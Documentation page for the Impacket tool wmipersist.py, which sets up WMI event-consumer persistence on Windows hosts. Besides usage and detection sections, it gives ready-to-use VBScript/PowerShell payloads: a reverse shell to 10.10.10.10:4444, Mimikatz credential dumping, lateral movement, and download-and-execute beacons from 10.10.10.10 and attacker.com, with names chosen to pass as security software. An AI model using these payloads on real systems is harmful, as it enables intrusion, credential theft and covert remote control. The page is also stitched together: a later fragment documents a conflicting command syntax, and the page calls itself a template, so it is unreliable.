# wmipersist.py

## Overview
`wmipersist.py` is a WMI-based persistence tool in the Impacket suite. This tool is categorized under Persistence and provides functionality for creating and removing WMI Event Consumers and Filters that execute Visual Basic scripts based on system events or timers.

## Detailed Description
`wmipersist.py` creates a sophisticated persistence mechanism using Windows Management Instrumentation (WMI) Event Consumer/Filter architecture. The tool establishes a link between an event filter (trigger condition) and an event consumer (VBScript payload) that executes when the specified conditions are met. This provides a stealthy persistence method that survives reboots and is difficult to detect through traditional means.

The tool supports two trigger mechanisms:
1. **Event-based triggers**: Execute payload when specific system events occur (process creation, file access, etc.)
2. **Timer-based triggers**: Execute payload at regular intervals

WMI persistence is particularly effective because it operates at the Windows management layer and can be configured to execute with high privileges without requiring traditional startup locations.

### Key Features:
- **WMI Event Consumers**: Create ActiveScriptEventConsumer objects for script execution
- **Flexible Triggers**: Support for both WQL event filters and timer-based execution
- **VBScript Payloads**: Execute arbitrary VBScript code on trigger events
- **Persistent Storage**: WMI objects stored in WMI repository for persistence across reboots
- **Administrative Cleanup**: Remove installed persistence mechanisms completely
- **DCOM Integration**: Uses DCOM for remote WMI management

### Technical Details:
- Uses DCOM connection to WMI service (root/subscription namespace)
- Creates ActiveScriptEventConsumer, __EventFilter, and __FilterToConsumerBinding objects
- Supports WQL (WMI Query Language) for complex event filtering
- Implements __IntervalTimerInstruction for timer-based persistence
- Compatible with VBScript scripting engine

## Command Line Options

```
usage: wmipersist.py [-h] [-debug] [-ts] [-com-version MAJOR:MINOR] [-hashes LMHASH:NTHASH]
                     [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                     target {install,remove} ...

Required Arguments:
  target                [domain/][username[:password]@]<address>

Actions:
  install               Install WMI event consumer/filter
  remove                Remove WMI event consumer/filter

Install Options:
  -name NAME            Event name (required)
  -vbs VBS_FILE         VBS filename containing script to execute (required)
  -filter FILTER        WQL filter string to trigger script
  -timer TIMER          Milliseconds interval to trigger script

Remove Options:
  -name NAME            Event name to remove (required)

Connection Options:
  -com-version MAJOR:MINOR  DCOM version (e.g., 5.7)
  -debug                Turn DEBUG output ON
  -ts                   Add timestamp to logging output

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller
```

## Usage Examples

### Basic Timer-based Persistence
```bash
# Create VBScript payload file
cat > payload.vbs << 'EOF'
Dim objFS, objFile
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objFile = objFS.OpenTextFile("C:\Windows\Temp\persistence.log", 8, true)
objFile.WriteLine Now() & " - WMI Persistence Active"
objFile.Close
EOF

# Install timer-based persistence (execute every 60000ms = 1 minute)
python3 wmipersist.py domain.com/admin:password@192.168.1.100 install \
  -name TimerPersist -vbs payload.vbs -timer 60000

# Remove the persistence
python3 wmipersist.py domain.com/admin:password@192.168.1.100 remove \
  -name TimerPersist
```

### Event-based Persistence (Process Creation)
```bash
# Create payload to execute when calc.exe is started
cat > process_monitor.vbs << 'EOF'
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c echo Process Created >> C:\Windows\Temp\proc_monitor.log", 0, False
EOF

# Install event-based persistence
python3 wmipersist.py domain.com/admin:password@192.168.1.100 install \
  -name ProcessMon -vbs process_monitor.vbs \
  -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "calc.exe"'
```

### Advanced Event Filters
```bash
# Monitor for new user logons
cat > logon_monitor.vbs << 'EOF'
Dim objFS, objFile
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objFile = objFS.OpenTextFile("C:\Windows\Temp\logon_monitor.log", 8, true)
objFile.WriteLine Now() & " - User Logon Detected"
objFile.Close
EOF

python3 wmipersist.py domain.com/admin:password@192.168.1.100 install \
  -name LogonMon -vbs logon_monitor.vbs \
  -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA "Win32_LogonSession"'

# Monitor file creation in sensitive directories
python3 wmipersist.py domain.com/admin:password@192.168.1.100 install \
  -name FileMon -vbs file_monitor.vbs \
  -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA "CIM_DataFile" AND TargetInstance.Path LIKE "%\\System32\\%"'
```

### Payload Examples
```bash
# Reverse shell payload
cat > reverse_shell.vbs << 'EOF'
Dim objShell, objExec
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("powershell.exe -WindowStyle Hidden -Command ""$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()""")
EOF

# Credential harvesting payload
cat > cred_harvest.vbs << 'EOF'
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Invoke-Mimikatz -DumpCreds | Out-File C:\Windows\Temp\creds.txt -Append""", 0, False
EOF

# Lateral movement payload
cat > lateral_move.vbs << 'EOF'
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Invoke-WMIExec -Target 192.168.1.101 -Username admin -Password password -Command 'whoami > C:\Windows\Temp\lateral.txt'""", 0, False
EOF
```

### Authentication Methods
```bash
# Using NTLM hashes
python3 wmipersist.py domain.com/admin@192.168.1.100 install \
  -name HashAuth -vbs payload.vbs -timer 300000 \
  -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

# Using Kerberos authentication
python3 wmipersist.py domain.com/admin@192.168.1.100 install \
  -name KerbAuth -vbs payload.vbs -timer 300000 -k -dc-ip 192.168.1.10

# Using AES key for Kerberos
python3 wmipersist.py domain.com/admin@192.168.1.100 install \
  -name AESAuth -vbs payload.vbs -timer 300000 \
  -aesKey a1b2c3d4e5f6789abcdef0123456789a
```

## Attack Integration

### Post-Exploitation Persistence
```bash
# Establish beaconing persistence after initial compromise
cat > beacon.vbs << 'EOF'
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/beacon.ps1')""", 0, False
EOF

python3 wmipersist.py domain.com/compromised_user:password@192.168.1.100 install \
  -name C2Beacon -vbs beacon.vbs -timer 600000  # Every 10 minutes
```

### Privilege Escalation Monitoring
```bash
# Monitor for privilege escalation opportunities
cat > privesc_monitor.vbs << 'EOF'
Dim objShell
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Get-Process | Where-Object {$_.ProcessName -match 'lsass|winlogon|services'} | Out-File C:\Windows\Temp\priv_procs.txt -Append""", 0, False
EOF

python3 wmipersist.py domain.com/user:password@192.168.1.100 install \
  -name PrivEscMon -vbs privesc_monitor.vbs \
  -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND (TargetInstance.Name = "runas.exe" OR TargetInstance.Name = "psexec.exe")'
```

### Defense Evasion
```bash
# Execute during specific time windows to avoid detection
cat > time_based.vbs << 'EOF'
Dim currentHour
currentHour = Hour(Now())
If currentHour >= 18 Or currentHour <= 6 Then
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Your-Payload-Here""", 0, False
End If
EOF

# Install with timer to check time conditions
python3 wmipersist.py domain.com/admin:password@192.168.1.100 install \
  -name TimeBasedPersist -vbs time_based.vbs -timer 3600000  # Check every hour
```

## Security Implications

### Detection Challenges
- **WMI Repository**: Persistence stored in WMI repository, not traditional locations
- **Process Hollowing**: Can execute without creating obvious process artifacts
- **Event-based Triggers**: Executes only when specific conditions are met
- **Administrative Privileges**: Often executed with SYSTEM privileges

### Defensive Considerations
```bash
# Monitor WMI Event Consumer creation
# Windows Event ID 5861 (WMI permanent event consumer created)

# PowerShell detection commands
Get-WmiObject -Class __EventConsumer -Namespace "root\subscription"
Get-WmiObject -Class __EventFilter -Namespace "root\subscription" 
Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription"

# Registry monitoring for WMI persistence
HKLM\SOFTWARE\Microsoft\Wbem\ESS\
```

### Detection Methods
```bash
# List all WMI event consumers
wmic /namespace:"\\root\subscription" PATH __EventConsumer GET Name, ScriptingEngine, ScriptText

# Check for suspicious event filters
wmic /namespace:"\\root\subscription" PATH __EventFilter GET Name, Query

# Identify filter-to-consumer bindings
wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding GET Consumer, Filter
```

## Troubleshooting

### Common Issues
1. **Access Denied**: Requires administrative privileges for WMI management
2. **WMI Service Unavailable**: Ensure WMI service is running on target
3. **Namespace Errors**: Verify root/subscription namespace accessibility
4. **Script Execution Errors**: Test VBScript syntax before deployment

### Debugging
```bash
# Enable debug output
python3 wmipersist.py domain.com/admin:password@192.168.1.100 install \
  -name DebugTest -vbs payload.vbs -timer 60000 -debug

# Test VBScript syntax locally
cscript //nologo payload.vbs

# Verify WMI objects were created
wmic /namespace:"\\root\subscription" PATH ActiveScriptEventConsumer WHERE Name="YourEventName" GET Name, ScriptText
```

### Cleanup
```bash
# Remove specific persistence mechanism
python3 wmipersist.py domain.com/admin:password@192.168.1.100 remove -name EventName

# Manual cleanup if tool unavailable
wmic /namespace:"\\root\subscription" PATH ActiveScriptEventConsumer WHERE Name="EventName" DELETE
wmic /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="EF_EventName" DELETE
wmic /namespace:"\\root\subscription" PATH __IntervalTimerInstruction WHERE TimerId="TI_EventName" DELETE
```

## Related Tools
- **wmiexec.py**: WMI-based remote command execution
- **wmiquery.py**: WMI query execution and enumeration
- **dcomexec.py**: DCOM-based remote execution
- **atexec.py**: Task scheduler persistence
- **services.py**: Service-based persistence

## Technical References
- [WMI Event Consumers](https://docs.microsoft.com/en-us/windows/win32/wmisdk/monitoring-events)
- [WQL Event Queries](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi)
- [ActiveScriptEventConsumer Class](https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer)
- [WMI Persistence Techniques](https://attack.mitre.org/techniques/T1546/003/)

# Using hash authentication
python3 wmipersist.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Install persistence with specific trigger interval
python3 wmipersist.py -action install -name "SystemUpdate" -command "powershell.exe -enc <base64>" -trigger-interval 3600 domain/user:pass@target

# Remove specific persistence mechanism
python3 wmipersist.py -action remove -name "SystemUpdate" domain/user:pass@target

# List all WMI event subscriptions for forensic analysis
python3 wmipersist.py -action list domain/user:pass@target
```

## Attack Chain Integration

### Post-exploitation Persistence Setup
```bash
# Step 1: Initial compromise and credential extraction
python3 secretsdump.py domain/user:pass@target

# Step 2: Establish WMI persistence with extracted credentials
python3 wmipersist.py -action install -name "WindowsDefender" -command "cmd /c powershell.exe IEX(New-Object Net.WebClient).downloadString('http://attacker.com/payload')" domain/user@target

# Step 3: Verify persistence installation
python3 wmipersist.py -action list domain/user@target
```

### Stealth Persistence with Cleanup
```bash
# Step 1: Install low-profile persistence
python3 wmipersist.py -action install -name "SecurityCenter" -command "schtasks /create /tn Updates /tr beacon.exe /sc minute /mo 60" -trigger-interval 86400 domain/user:pass@target

# Step 2: Test persistence trigger manually
python3 wmiexec.py domain/user:pass@target "cmd /c schtasks /query /tn Updates"
```

## Prerequisites
- Administrative credentials on target system
- Network access to target on WMI ports (135, random high ports)
- Python 3.x with Impacket library installed
- VBScript file for persistence payload
- Windows target system (WMI not available on Linux/Unix)

## Detection Considerations
- **Event IDs**: 
  - Event ID 19-21 (WMI Event Consumer activity)
  - Event ID 5857-5861 (WMI Activity)
  - Event ID 4624/4625 (Authentication events)
- **Network Indicators**: 
  - Connections to port 135 (RPC endpoint mapper)
  - WMI DCOM traffic on random high ports
  - Persistent network connections
- **Process Indicators**: 
  - WMI provider processes (wmiprvse.exe)
  - VBScript/PowerShell execution triggered by events
  - Suspicious ActiveScriptEventConsumer processes
- **File Indicators**: 
  - VBScript files in unusual locations
  - Payload files dropped by persistence mechanism
- **Registry Indicators**: 
  - WMI subscription entries in WMI repository
  - Event consumer registrations

## Defensive Measures
- Monitor WMI event consumer creation and modifications
- Enable WMI Activity logging (Event IDs 5857-5861)
- Implement application whitelisting to prevent unauthorized scripts
- Use WMI event log monitoring and alerting
- Regular auditing of WMI subscriptions and consumers
- Network segmentation to limit WMI access

## Common Issues and Troubleshooting

### WMI Access Denied Errors
```bash
# Problem: Insufficient privileges for WMI operations
# Solution: Ensure account has administrative privileges
# Verify account is in local Administrators group or equivalent
python3 wmipersist.py domain/admin:pass@target install -name test -vbs payload.vbs
```

### VBScript Execution Failures
```bash
# Problem: VBScript payload fails to execute
# Solution: Test VBScript syntax and execution context
# Ensure VBScript is properly formatted and has required permissions
cscript payload.vbs  # Test locally first
```

## Related Tools
- [wmiexec.py](wmiexec.md) - WMI command execution
- [wmiquery.py](wmiquery.md) - WMI information gathering
- [psexec.py](psexec.md) - Alternative persistence methods
- [services.py](services.md) - Service-based persistence

---

*Note: This documentation is a template. Please refer to the actual tool's help output and source code for complete and accurate information.*
